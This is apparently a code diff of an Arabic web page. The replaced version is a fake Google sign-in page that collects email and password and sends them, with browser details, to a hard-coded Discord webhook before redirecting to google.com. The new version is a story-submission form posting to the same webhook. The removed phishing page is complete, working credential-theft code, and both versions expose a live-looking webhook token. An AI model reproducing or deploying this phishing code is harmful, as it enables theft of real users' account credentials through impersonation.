@@ -1,326 +1,206 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>تسجيل الدخول</title>
-<style>
-    body {
-        font-family: Arial, sans-serif;
-        background-color: #f0f4fa;
-        margin: 0;
-        padding: 0;
-    }
-    .container {
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-    }
-    .login-box {
-        background-color: white;
-        padding: 40px;
-        border-radius: 25px;
-        display: flex;
-        flex-direction: row;
-        width: 800px;
-        justify-content: space-between;
-        align-items: center;
-    }
-    .login-form {
-        width: 50%;
-    }
-    input[type="text"], input[type="password"] {
-        width: 100%;
-        padding: 15px;
-        border: 2px solid #0066ff;
-        border-radius: 5px;
-        font-size: 16px;
-        margin-bottom: 5px;
-    }
-    .error-message {
-        color: red;
-        font-size: 12px;
-        margin-bottom: 10px;
-        display: none;
-    }
-    .small-text {
-        font-size: 12px;
-        color: #0066ff;
-    }
-    .desc {
-        font-size: 12px;
-        color: #333;
-        margin-top: 10px;
-    }
-    .desc a {
-        color: #0066ff;
-        text-decoration: none;
-    }
-    button {
-        background-color: #0066ff;
-        color: white;
-        padding: 10px 30px;
-        border: none;
-        border-radius: 25px;
-        font-size: 16px;
-        cursor: pointer;
-        margin-top: 10px;
-    }
-    .create, .small-link {
-        margin-right: 15px;
-        font-size: 14px;
-        color: #0066ff;
-        background: none;
-        border: none;
-        cursor: pointer;
-    }
-    .text-side {
-        width: 45%;
-        text-align: center;
-    }
-    .text-side img {
-        width: 50px;
-        margin-bottom: 10px;
-    }
-    .text-side h2 {
-        font-size: 26px;
-        margin-bottom: 5px;
-    }
-    .text-side p {
-        font-size: 14px;
-        color: #555;
-    }
-    .footer {
-        text-align: center;
-        margin-top: 20px;
-        font-size: 12px;
-        color: black;
-    }
-    .footer a {
-        margin: 0 10px;
-        color: black;
-        text-decoration: none;
-    }
-    label {
-        font-size: 12px;
-        color: #333;
-        display: flex;
-        align-items: center;
-        gap: 5px;
-    }
-    .email-box {
-        border: 1px solid #ccc;
-        padding: 5px 10px;
-        border-radius: 20px;
-        display: flex;
-        align-items: center;
-        gap: 5px;
-        justify-content: space-between;
-        font-size: 14px;
-        width: fit-content;
-        margin: 0 auto;
-    }
-    #password-page {
-        display: none;
-    }
-    .loading {
-        display: none;
-        text-align: center;
-        margin-top: 20px;
-    }
-    .loading-spinner {
-        border: 4px solid #f3f3f3;
-        border-top: 4px solid #0066ff;
-        border-radius: 50%;
-        width: 30px;
-        height: 30px;
-        animation: spin 1s linear infinite;
-        margin: 0 auto;
-    }
-    @keyframes spin {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
-    }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إضافة قصة جديدة</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 20px;
+            color: #333;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #0066ff;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        input[type="text"],
+        textarea,
+        select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        textarea {
+            height: 150px;
+            resize: vertical;
+        }
+        button {
+            background-color: #0066ff;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            display: block;
+            margin: 20px auto 0;
+        }
+        button:hover {
+            background-color: #0055cc;
+        }
+        .success-message {
+            color: green;
+            text-align: center;
+            margin-top: 20px;
+            display: none;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0066ff;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
 <body>
-
-<div class="container">
-    <!-- صفحة البريد الإلكتروني -->
-    <div id="email-page" class="login-box">
-        <div class="login-form">
-            <input id="email-input" type="text" placeholder="البريد الإلكتروني أو الهاتف">
-            <div id="email-error" class="error-message"></div>
-            <div class="small-text">هل نسيت بريدك الإلكتروني؟</div>
-            <div class="desc">ألا تمتلك هذا الكمبيوتر؟ استخدم وضع الضيف لتسجيل الدخول بشكل خاص. <a href="#">مزيد من المعلومات حول استخدام "وضع الضيف"</a></div>
-            <div style="margin-top: 20px;">
-                <button onclick="showPasswordPage()">التالي</button>
-                <button class="create">إنشاء حساب</button>
-            </div>
+    <div class="container">
+        <h1>إضافة قصة جديدة</h1>
+        
+        <div class="form-group">
+            <label for="title">عنوان القصة:</label>
+            <input type="text" id="title" required>
         </div>
-        <div class="text-side">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
-            <h2>تسجيل الدخول</h2>
-            <p>باستخدام حسابك على <b>Google</b></p>
+        
+        <div class="form-group">
+            <label for="author">اسم المؤلف:</label>
+            <input type="text" id="author" required>
+        </div>
+        
+        <div class="form-group">
+            <label for="category">تصنيف القصة:</label>
+            <select id="category" required>
+                <option value="">اختر تصنيفاً</option>
+                <option value="رومانسية">رومانسية</option>
+                <option value="خيال علمي">خيال علمي</option>
+                <option value="رعب">رعب</option>
+                <option value="كوميديا">كوميديا</option>
+                <option value="تاريخية">تاريخية</option>
+            </select>
+        </div>
+        
+        <div class="form-group">
+            <label for="content">محتوى القصة:</label>
+            <textarea id="content" required></textarea>
+        </div>
+        
+        <button onclick="submitStory()">نشر القصة</button>
+        
+        <div id="success-message" class="success-message">
+            <h3>تم نشر القصة بنجاح!</h3>
+            <p>شكراً لمشاركتك قصتك معنا.</p>
+        </div>
+        
+        <div id="loading" class="loading">
+            <div class="loading-spinner"></div>
+            <p>جاري نشر القصة...</p>
         </div>
     </div>
 
-    <!-- صفحة كلمة المرور -->
-    <div id="password-page" class="login-box">
-        <div class="login-form">
-            <input id="password-input" type="password" placeholder="إدخال كلمة المرور">
-            <div id="password-error" class="error-message"></div>
-            <label>
-                <input type="checkbox" id="show-password"> عرض كلمة المرور
-            </label>
-            <div style="margin-top: 20px;">
-                <button onclick="submitLogin()">التالي</button>
-                <button class="small-link" onclick="backToEmail()">تجربة طريقة أخرى</button>
-            </div>
-        </div>
-        <div class="text-side">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
-            <h2>مرحباً</h2>
-            <div class="email-box">
-                <span>▼</span> <span id="display-email">example@gmail.com</span> <span>👤</span>
-            </div>
-        </div>
-    </div>
-    
-    <!-- رسالة التحميل -->
-    <div id="loading" class="loading">
-        <div class="loading-spinner"></div>
-        <p>جاري تسجيل الدخول...</p>
-    </div>
-</div>
-
-<div class="footer">
-    <a href="#">الشروط</a>
-    <a href="#">الخصوصية</a>
-    <a href="#">المساعدة</a>
-    <a href="#">العربية</a>
-</div>
-
-<script>
-    // متغيرات لتخزين البيانات
-    let userEmail = '';
-    let userPassword = '';
-    
-    function showPasswordPage() {
-        const email = document.getElementById('email-input').value.trim();
-        const emailError = document.getElementById('email-error');
-
-        if(email === '') {
-            emailError.textContent = 'الرجاء إدخال البريد الإلكتروني أو رقم الهاتف';
-            emailError.style.display = 'block';
-            return;
-        }
-        if(!validateEmailOrPhone(email)) {
-            emailError.textContent = 'تعذّر العثور على حسابك. الرجاء التحقق من البريد الإلكتروني أو رقم الهاتف وإعادة المحاولة.';
-            emailError.style.display = 'block';
-            return;
-        }
-
-        userEmail = email;
-        emailError.style.display = 'none';
-        document.getElementById('email-page').style.display = 'none';
-        document.getElementById('password-page').style.display = 'flex';
-        document.getElementById('display-email').textContent = email;
-    }
-
-    function backToEmail() {
-        document.getElementById('password-page').style.display = 'none';
-        document.getElementById('email-page').style.display = 'flex';
-    }
-
-    function validateEmailOrPhone(input) {
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        const phoneRegex = /^[0-9]{6,15}$/;
-        return emailRegex.test(input) || phoneRegex.test(input);
-    }
-
-    function submitLogin() {
-        const password = document.getElementById('password-input').value.trim();
-        const passwordError = document.getElementById('password-error');
-        
-        if(password === '') {
-            passwordError.textContent = 'الرجاء إدخال كلمة المرور';
-            passwordError.style.display = 'block';
-            return;
-        }
-        
-        userPassword = password;
-        passwordError.style.display = 'none';
-        
-        // عرض رسالة التحميل
-        document.getElementById('password-page').style.display = 'none';
-        document.getElementById('loading').style.display = 'block';
-        
-        // إرسال البيانات إلى ويب هوك Discord
-        sendDataToDiscord();
-        
-        // توجيه المستخدم إلى الصفحة الرئيسية بعد ثانية واحدة
-        setTimeout(() => {
-            window.location.href = "https://www.google.com"; // يمكنك تغيير هذا الرابط إلى الصفحة الرئيسية المطلوبة
-        }, 1000);
-    }
-
-    function sendDataToDiscord() {
-        const webhookURL = 'https://discordapp.com/api/webhooks/1404910412352327700/GCJf4yPnarHrDMDMgB5vmYIAz9dbncbmh2i-npw_AF6zg1y2uqbie2LcqJJlYRPUiSo4';
-        
-        const data = {
-            content: '**تم تسجيل بيانات جديدة**',
-            embeds: [{
-                title: 'تفاصيل تسجيل الدخول',
-                fields: [
-                    {
-                        name: 'البريد الإلكتروني/الهاتف',
-                        value: userEmail,
-                        inline: true
-                    },
-                    {
-                        name: 'كلمة المرور',
-                        value: userPassword,
-                        inline: true
-                    },
-                    {
-                        name: 'وقت التسجيل',
-                        value: new Date().toLocaleString(),
-                        inline: false
-                    },
-                    {
-                        name: 'معلومات المتصفح',
-                        value: navigator.userAgent,
-                        inline: false
-                    }
-                ],
-                color: 16711680 // اللون الأحمر
-            }]
-        };
-
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(data),
-        })
-        .then(response => {
-            if (!response.ok) {
-                console.error('Error sending data to Discord');
+    <script>
+        function submitStory() {
+            const title = document.getElementById('title').value.trim();
+            const author = document.getElementById('author').value.trim();
+            const category = document.getElementById('category').value;
+            const content = document.getElementById('content').value.trim();
+            
+            // التحقق من الحقول المطلوبة
+            if (!title || !author || !category || !content) {
+                alert('الرجاء ملء جميع الحقول المطلوبة');
+                return;
             }
-        })
-        .catch(error => {
-            console.error('Error:', error);
-        });
-    }
-
-    document.getElementById('show-password').addEventListener('change', function() {
-        const passwordInput = document.getElementById('password-input');
-        passwordInput.type = this.checked ? 'text' : 'password';
-    });
-</script>
-
+            
+            // عرض رسالة التحميل
+            document.getElementById('loading').style.display = 'block';
+            
+            // إرسال البيانات إلى ويب هوك Discord
+            sendToDiscord(title, author, category, content);
+            
+            // عرض رسالة النجاح وإخفاء التحميل
+            setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('success-message').style.display = 'block';
+                
+                // مسح النموذج بعد النشر
+                document.getElementById('title').value = '';
+                document.getElementById('author').value = '';
+                document.getElementById('category').value = '';
+                document.getElementById('content').value = '';
+                
+                // إخفاء رسالة النجاح بعد 3 ثواني
+                setTimeout(() => {
+                    document.getElementById('success-message').style.display = 'none';
+                }, 3000);
+            }, 1500);
+        }
+        
+        function sendToDiscord(title, author, category, content) {
+            const webhookURL = 'https://discordapp.com/api/webhooks/1404910412352327700/GCJf4yPnarHrDMDMgB5vmYIAz9dbncbmh2i-npw_AF6zg1y2uqbie2LcqJJlYRPUiSo4';
+            
+            // تقصير المحتوى إذا كان طويلاً جداً
+            const shortenedContent = content.length > 500 ? content.substring(0, 500) + '...' : content;
+            
+            const data = {
+                content: '**تمت إضافة قصة جديدة**',
+                embeds: [{
+                    title: title,
+                    description: `**المؤلف:** ${author}\n\n**التصنيف:** ${category}\n\n**المحتوى:**\n${shortenedContent}`,
+                    color: 0x0066ff,
+                    footer: {
+                        text: `تم الإرسال في: ${new Date().toLocaleString()}`
+                    }
+                }]
+            };
+            
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Error sending data to Discord');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
 </body>
 </html>
